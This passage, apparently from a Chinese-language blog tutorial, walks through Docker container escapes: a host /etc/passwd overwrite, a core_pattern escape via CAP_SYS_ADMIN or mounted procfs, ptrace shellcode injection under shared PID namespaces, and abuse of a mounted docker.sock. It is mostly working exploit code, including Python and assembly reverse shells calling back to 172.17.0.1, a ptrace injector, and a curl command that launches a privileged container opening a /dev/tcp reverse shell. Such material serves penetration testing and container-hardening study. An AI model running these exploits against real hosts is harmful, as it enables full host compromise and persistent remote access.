O_RDWR)) &lt; 0)</span><br><span class="line">    die(&quot;[-] open_by_handle&quot;);</span><br><span class="line">  char * line = NULL;</span><br><span class="line">  size_t len = 0;</span><br><span class="line">  ssize_t read;</span><br><span class="line">  FILE *  fptr = fopen(argv[2], &quot;r&quot;);</span><br><span class="line">  while ((read = getline( &amp; line, &amp; len, fptr)) != -1) &#123;</span><br><span class="line">    printf(&quot;%p&quot;,line);</span><br><span class="line">    write(fd2, line, read);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Success!!\n&quot;);</span><br><span class="line">  close(fd2);</span><br><span class="line">  close(fd1);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;test:$6$7p31yPiD$xLKWF5uIeS6oibSO2nwDlSQEjrzgPEFcRkSVTCEaeoxibJnXjC5NOmTVC/dLvuSHBrVt8tknWaPZ/65PECL0C1:0:0::/root:/bin/sh&#x27;&gt;&gt;passwd</span><br><span class="line">./write /etc/passwd passwd</span><br></pre></td></tr></table></figure>
<p>可以发现宿主机的&#x2F;etc&#x2F;passwd被我们覆盖了<br>然后ssh登陆宿主机,密码是123456</p>
<h2 id="CAP-SYS-ADMIN"><a href="#CAP-SYS-ADMIN" class="headerlink" title="CAP_SYS_ADMIN"></a><strong>CAP_SYS_ADMIN</strong></h2><p>这个权限应该是实际业务里面最常见的权限了，很多容器都会开放这个权限，针对这个权限的逃逸也有很多方法，大家可以根据自己的喜好去利用</p>
<h3 id="apparmor关闭"><a href="#apparmor关闭" class="headerlink" title="apparmor关闭"></a>apparmor关闭</h3><p>docker默认关于AppArmor的配置是docker-default,此时会不允许mount的syscall，那么我们需要关闭AppArmor<br>CentOS等Red Hat系的Linux操作系统上默认没有安装AppArmor。</p>
<h4 id="实验环境配置-3"><a href="#实验环境配置-3" class="headerlink" title="实验环境配置"></a><strong>实验环境配置</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04 bash</span><br></pre></td></tr></table></figure>
<h4 id="实际利用-3"><a href="#实际利用-3" class="headerlink" title="实际利用"></a><strong>实际利用</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/status|grep CapEff</span><br></pre></td></tr></table></figure>
<p>发现有CAP_SYS_ADMIN，那么可以逃逸，主要分为打proc或者打cgroup,但是打proc更为方便，同时受到的限制更少，更为通用,这里我就只以core_pattern的方式介绍逃逸<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786457-8873cbd8-3466-4641-8d6e-c4ef49e85558.png#averageHue=%23191614&clientId=ubafe9d16-78e9-4&from=paste&id=u9a591fd9&originHeight=154&originWidth=3836&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u616c9640-dc45-4cbb-a8ee-b87f1dbf386&title="></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/proc</span><br><span class="line">mount -t proc none -o rw /tmp/proc</span><br></pre></td></tr></table></figure>
<p>获取容器在宿主机的路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/mountinfo|grep overlay</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786434-feaae7e2-3a0e-4847-92b5-405557d64525.png#averageHue=%23492922&clientId=ubafe9d16-78e9-4&from=paste&id=u0dd6bd00&originHeight=190&originWidth=3840&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u5484b209-1229-46d2-8c30-9f0c3a3cfcb&title="><br>这里就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/docker/overlay2/fe02e21b1c8e2ca4fe60dd2bed6089ae837bf4e6f62a5bc81707cde3adca13cd/merged</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786452-ec62f4db-9544-47e7-af99-b6c59941abf4.png#averageHue=%23070905&clientId=ubafe9d16-78e9-4&from=paste&id=ub4be4357&originHeight=134&originWidth=2712&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=udf244725-af22-477a-adb8-461389e3fd6&title="><br>然后在&#x2F;tmp目录下编写一个反弹shell的python脚本,别忘记赋予执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">lhost = &quot;172.17.0.1&quot; # 根据实际情况修改</span><br><span class="line">lport = 10000 # 根据实际情况修改</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), 0)</span><br><span class="line">    os.dup2(s.fileno(), 1)</span><br><span class="line">    os.dup2(s.fileno(), 2)</span><br><span class="line">    os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)#HISTFILE这个环境变量指示出你的运行环境中保存命令历史的文件,这里可以帮我们隐藏</span><br><span class="line">    pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>修改core_pattern</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;|/var/lib/docker/overlay2/fe02e21b1c8e2ca4fe60dd2bed6089ae837bf4e6f62a5bc81707cde3adca13cd/merged/tmp/.x.py &quot; &gt;  /tmp/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
<p>之前之所以要获取容器的在宿主机上的路径是因为，当异常触发的时候，相当于是在宿主机的namespace里，我们必须要获取脚本的绝对路径，而不仅仅是脚本在容器里的路径<br>接下来编写一个触发异常的c代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    int *a = NULL;</span><br><span class="line">    *a = 1;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先监听shell的回连端口，然后编译并执行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786522-700f6053-ce49-44d7-adc2-f81b637dc7a8.png#averageHue=%23040404&clientId=ubafe9d16-78e9-4&from=paste&id=u05a1ee1c&originHeight=152&originWidth=702&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u9896dca2-5c4b-41db-950d-7bc9f9b3345&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786496-9edb21af-cc6e-409a-920d-8f71b7c9f333.png#averageHue=%23050505&clientId=ubafe9d16-78e9-4&from=paste&id=u8122ed78&originHeight=1096&originWidth=1656&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0abd4a80-b81e-490f-9dd3-646e8750e54&title="></p>
<h1 id="危险的namespace共享"><a href="#危险的namespace共享" class="headerlink" title="危险的namespace共享"></a><strong>危险的namespace共享</strong></h1><h2 id="Network共享"><a href="#Network共享" class="headerlink" title="Network共享"></a><strong>Network共享</strong></h2><p>这个在实际场景也是比较常见的，攻击思路也比较广泛，如果容器和宿主机进行了network的共享，在docker里面是–net&#x3D;host的配置，那么我们就可以在容器里面访问宿主机可以访问到的网络。</p>
<ul>
<li>如果是k8s网络，那么是不是可以打api server未授权,dashboard未授权，etcd未授权，kubelet未授权</li>
<li>如果不是k8s编排，那么就打同网段的主机(fscan直接开扫)</li>
</ul>
<p>那么怎么知道可以扫哪些ip</p>
<ul>
<li>环境变量里的ip和host</li>
<li>&#x2F;etc&#x2F;hosts里的网段</li>
<li>&#x2F;etc&#x2F;resolv.conf里的网段</li>
</ul>
<h2 id="PID共享"><a href="#PID共享" class="headerlink" title="PID共享"></a>PID共享</h2><p>pid共享也是实际比较常见的场景，当我们发现有些进程对应的脚本文件在容器里面并没有，那么就是开启了pid共享，开启了pid共享还是有很多操作空间的</p>
<h3 id="特权容器"><a href="#特权容器" class="headerlink" title="+特权容器"></a>+特权容器</h3><h4 id="实验环境配置-4"><a href="#实验环境配置-4" class="headerlink" title="实验环境配置"></a>实验环境配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --pid=host  --privileged  ubuntu:18.04</span><br></pre></td></tr></table></figure>
<h4 id="实际利用-4"><a href="#实际利用-4" class="headerlink" title="实际利用"></a>实际利用</h4><h5 id="直接chroot"><a href="#直接chroot" class="headerlink" title="直接chroot"></a>直接chroot</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/1/root</span><br><span class="line">chroot .</span><br></pre></td></tr></table></figure>
<p>直接逃逸,然后可以再配合前面提到的方法进行完整的逃逸</p>
<h5 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h5><p>这里面要注意两种情况</p>
<ul>
<li>shellcode的问题，shellcode可能会出现\x90f1这种,需要在\x901f中间加””,不然解析会出现问题,hex escape sequence out of range</li>
<li>注释掉的shellcode存在后台进程注入的问题，因为没有做dup2<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">unsigned char shellcode[]=&quot;&quot;;</span><br><span class="line">char *p;</span><br><span class="line">void inject_data (pid_t pid,  uint32_t *dst)</span><br><span class="line">&#123;</span><br><span class="line">        uint32_t *src = (uint32_t *) shellcode;</span><br><span class="line">        for (int i = 0; i &lt; sizeof(shellcode); i+=4, src++, dst++)</span><br><span class="line">        &#123;</span><br><span class="line">                if ((ptrace (PTRACE_POKETEXT, pid, dst, *src)) &lt; 0)</span><br><span class="line">                &#123;</span><br><span class="line">                        perror (&quot;ptrace(POKETEXT):&quot;);</span><br><span class="line">                        exit(1);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main (int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">        int                     syscall;</span><br><span class="line">        long                    dst;</span><br><span class="line">        if (argc != 2)</span><br><span class="line">        &#123;</span><br><span class="line">                fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);</span><br><span class="line">                exit (1);</span><br><span class="line">        &#125;</span><br><span class="line">        pid_t target = atoi (argv[1]);</span><br><span class="line">        if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">                perror (&quot;ptrace(ATTACH):&quot;);</span><br><span class="line">                exit (1);</span><br><span class="line">        &#125;</span><br><span class="line">        wait (NULL);</span><br><span class="line">        struct user_regs_struct regs;</span><br><span class="line">        if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">                perror (&quot;ptrace(GETREGS):&quot;);</span><br><span class="line">                exit (1);</span><br><span class="line">        &#125;</span><br><span class="line">        inject_data (target,(uint32_t *)regs.rip);</span><br><span class="line">        regs.rip += 2;</span><br><span class="line">        if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">                perror (&quot;ptrace(SETREGS):&quot;);</span><br><span class="line">                exit (1);</span><br><span class="line">        &#125;</span><br><span class="line">        if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">                perror (&quot;ptrace(DETACH):&quot;);</span><br><span class="line">                exit (1);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a><strong>shellcode编写</strong></h4><p>需要填写服务器的ip和端口，这里直接用python的socket库帮我们生成就好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">        global _start   </span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">        mov rdi,2 ;AF_INET</span><br><span class="line">        mov rsi,1;SOCK_STREAM</span><br><span class="line">        xor rdx,rdx</span><br><span class="line">        mov rax,0x29</span><br><span class="line">        syscall;socket</span><br><span class="line">        mov rdi,rax</span><br><span class="line">        push dword &#x27;&#x27;;socket.inet_aton(ip)</span><br><span class="line">        push word 0x901f;socket.htons(port)</span><br><span class="line">        push word 2;AF_INET</span><br><span class="line">        push rsp</span><br><span class="line">        pop rsi;</span><br><span class="line">        mov rdx,0x10;</span><br><span class="line">        mov rax,0x2A;</span><br><span class="line">        syscall;connect</span><br><span class="line">        mov rsi,3;</span><br><span class="line">    dup:</span><br><span class="line">        dec rsi</span><br><span class="line">        mov rax,0x21</span><br><span class="line">        syscall;dup2</span><br><span class="line">        jne dup</span><br><span class="line">        lea rdi,[rel msg]</span><br><span class="line">        xor rsi,rsi</span><br><span class="line">        xor rdx,rdx</span><br><span class="line">        mov rax, 0x3b</span><br><span class="line">        syscall</span><br><span class="line">        msg db &#x27;/bin/bash&#x27;,0</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 -o test.o test.asm</span><br><span class="line">ld -o test test.o</span><br><span class="line">objdump -s test #查看shellcode</span><br></pre></td></tr></table></figure>
<p>如果不想自己编译的话，用我下面这个脚本就可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">ip=&quot;&quot;</span><br><span class="line">port=8080</span><br><span class="line">shellcode=b&#x27;\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00H1\xd2\xb8)\x00\x00\x00\x0f\x05H\x89\xc7h&#x27;+socket.inet_aton(ip)+b&#x27;fh&#x27;+socket.htons(8080).to_bytes(2,&#x27;little&#x27;)+b&#x27;&quot;&quot;fj\x02T^\xba\x10\x00\x00\x00\xb8*\x00\x00\x00\x0f\x05\xbe\x03\x00\x00\x00H\xff\xce\xb8!\x00\x00\x00\x0f\x05u\xf4H\x8d=\r\x00\x00\x00H1\xf6H1\xd2\xb8;\x00\x00\x00\x0f\x05/bin/bash\x00&#x27;</span><br><span class="line">print(shellcode)</span><br></pre></td></tr></table></figure>
<p>把生成的shellcode直接复制进去即可</p>
<h3 id="不是特权容器"><a href="#不是特权容器" class="headerlink" title="不是特权容器"></a>不是特权容器</h3><p>这里我试了一下，就算给CAP_SYS_PTRACE和CAP_SYS_ADMIN都是不太好逃逸的，这里可能跟我docker版本比较新有关系，实际可以尝试一下，当pid共享的时候通过进程注入的方式来逃逸，这里就可以注入宿主机的进程，同时这种情况也可以关注一下，宿主机进程的目录我们是否有权限去写，或者说挂载了某些可控的目录<br>19.03.5版本的docker有CAP_STS_PTRACE和pid共享是可以直接注入的</p>
<h1 id="挂载不当"><a href="#挂载不当" class="headerlink" title="挂载不当"></a>挂载不当</h1><h2 id="procfs"><a href="#procfs" class="headerlink" title="procfs"></a>procfs</h2><p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多非常敏感，重要的文件。因为，将宿主机的procfs挂载到不受控的容器也是十分危险的，尤其是在该容器默认启用root权限，且没有开启User Namespace时<br>procfs中的&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern负责配置进程崩溃时内存转储数据的导出方式。<br><em>从2.6.19内核版本开始，linux支持在&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern中使用新语法。如果该文件中的首个字符是管道符(|),那么该行的剩余内容将被当作用户空间程序或脚本解析并执行</em><br>上述描述的新功能原本是为了方便用户获得并处理内存转储数据，然而，他提供命令执行能力作为后门的这种思路十分巧妙，具有一定的隐蔽性。</p>
<h3 id="实验环境配置-5"><a href="#实验环境配置-5" class="headerlink" title="实验环境配置"></a>实验环境配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /proc/:/host/proc/ ubuntu:18.04 bash</span><br></pre></td></tr></table></figure>
<h3 id="实际利用-5"><a href="#实际利用-5" class="headerlink" title="实际利用"></a>实际利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;Procfs is mounted.&quot; || echo &quot;Procfs is not mounted.&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049787119-098de410-5f03-42cf-ad40-843ddfc73fe4.png#averageHue=%23050504&clientId=ubafe9d16-78e9-4&from=paste&id=uabdcd8cc&originHeight=116&originWidth=2858&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ue4c954cf-4e39-47c1-a3df-391f65ea31f&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049787334-5d839018-e272-4a19-8591-abd2bf136f45.png#averageHue=%23050504&clientId=ubafe9d16-78e9-4&from=paste&id=u6807a7ba&originHeight=148&originWidth=1200&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ube4ea2e6-f663-4d58-8235-7a3ade2fe56&title="><br>由于挂载的原因，我们修改了core_pattern也会影响宿主机的core_pattern<br>获取容器在宿主机的路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/mountinfo|grep overlay</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049787510-a82fb9aa-b22b-4a53-bec6-7f4148b6aa19.png#averageHue=%23441c14&clientId=ubafe9d16-78e9-4&from=paste&id=u367a1021&originHeight=184&originWidth=3790&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ucc9d04ee-7cf2-4c39-8c16-9cf9cfe7c49&title="><br>这里就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/docker/overlay2/b2e03c5ab8daa7792345fd5499a54612c49b2323ec08f4011ba78c7226fa052f/merged</span><br></pre></td></tr></table></figure>
<p>然后在&#x2F;tmp目录下编写一个反弹shell的python脚本,别忘记赋予执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">lhost = &quot;172.17.0.1&quot; # 根据实际情况修改</span><br><span class="line">lport = 10000 # 根据实际情况修改</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), 0)</span><br><span class="line">    os.dup2(s.fileno(), 1)</span><br><span class="line">    os.dup2(s.fileno(), 2)</span><br><span class="line">    os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)#HISTFILE这个环境变量指示出你的运行环境中保存命令历史的文件,这里可以帮我们隐藏</span><br><span class="line">    pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>修改core_pattern</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;|/var/lib/docker/overlay2/b2e03c5ab8daa7792345fd5499a54612c49b2323ec08f4011ba78c7226fa052f/merged/tmp/.x.py &quot; &gt;  /host/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
<p>接下来编写一个触发异常的c代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    int *a = NULL;</span><br><span class="line">    *a = 1;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先监听shell的回连端口，然后编译并执行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049787582-bf291ae8-d773-45e4-8792-6b733ee36fb5.png#averageHue=%23060604&clientId=ubafe9d16-78e9-4&from=paste&id=u1648bedc&originHeight=150&originWidth=798&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u06f7d773-6bf9-46ed-9cbd-da70959f896&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788286-024ecab8-b796-4770-bb22-73a852734502.png#averageHue=%23171614&clientId=ubafe9d16-78e9-4&from=paste&id=ucd3a0bd2&originHeight=1094&originWidth=1764&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u04f5c875-9070-4642-b875-9af1e471259&title="></p>
<h2 id="docker-socket"><a href="#docker-socket" class="headerlink" title="docker socket"></a>docker socket</h2><h3 id="实验环境配置-6"><a href="#实验环境配置-6" class="headerlink" title="实验环境配置"></a>实验环境配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04 bash</span><br></pre></td></tr></table></figure>
<h3 id="实际利用-6"><a href="#实际利用-6" class="headerlink" title="实际利用"></a>实际利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name docker.sock 2&gt;/dev/null | wc -l | grep -q -v 0  &amp;&amp; echo &quot;Docker socket is mounted&quot; ||echo &quot;Docker socket is not mounted&quot;</span><br></pre></td></tr></table></figure>
<p>查看挂载了docker.sock<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788304-09dd0156-3f74-4a71-ac3f-42c8730ddf75.png#averageHue=%23050504&clientId=ubafe9d16-78e9-4&from=paste&id=u822ddf5a&originHeight=176&originWidth=3138&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ubb997d29-d7ad-4137-befc-187380a4b2f&title="><br>获取可以用的镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --unix-socket /run/docker.sock http://localhost/images/json</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788315-2d20fc6d-b4d2-45a0-9d26-b90537595648.png#averageHue=%231a1715&clientId=ubafe9d16-78e9-4&from=paste&id=u69c696b5&originHeight=226&originWidth=3840&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=udd180f9f-f364-40e8-a3db-9071fc7c1e4&title="><br>创建特权容器并且反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type: application/json&quot; -d &quot;&#123;</span><br><span class="line">     \&quot;Image\&quot;: \&quot;ubuntu:18.04\&quot;,</span><br><span class="line">     \&quot;HostConfig\&quot;: &#123;</span><br><span class="line">         \&quot;Privileged\&quot;: true</span><br><span class="line">     &#125;,</span><br><span class="line">   \&quot;Cmd\&quot;:[</span><br><span class="line">                 \&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/10001  0&gt;&amp;1\&quot;</span><br><span class="line">             ]</span><br><span class="line"> &#125;&quot; --unix-socket /run/docker.sock http://localhost/containers/create</span><br></pre></td></tr></table></figure>
<p>返回一个id<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788288-cf6e137a-9c33-4381-9be6-364fdf2e7b25.png#averageHue=%23050504&clientId=ubafe9d16-78e9-4&from=paste&id=uc36dadeb&originHeight=410&originWidth=1874&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uf2dc907c-cd12-4f92-88b2-2a450725506&title="><br>监听端口，并且启动容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST  --unix-socket /run/docker.sock http://localhost/containers/c083f630d5828591bba03b48f2193422f4e661149689d1cd9c12b2637e7450cd/start</span><br></pre></td></tr></table></figure>
<p>反弹了shell并且是特权容器<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788431-8e1e0f2e-70bf-44ee-98ee-bc95c015a728.png#averageHue=%23040404&clientId=ubafe9d16-78e9-4&from=paste&id=u0a9a0ed8&originHeight=1168&originWidth=1388&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u393faba1-bad0-497c-8de7-6254389a406&title="></p>
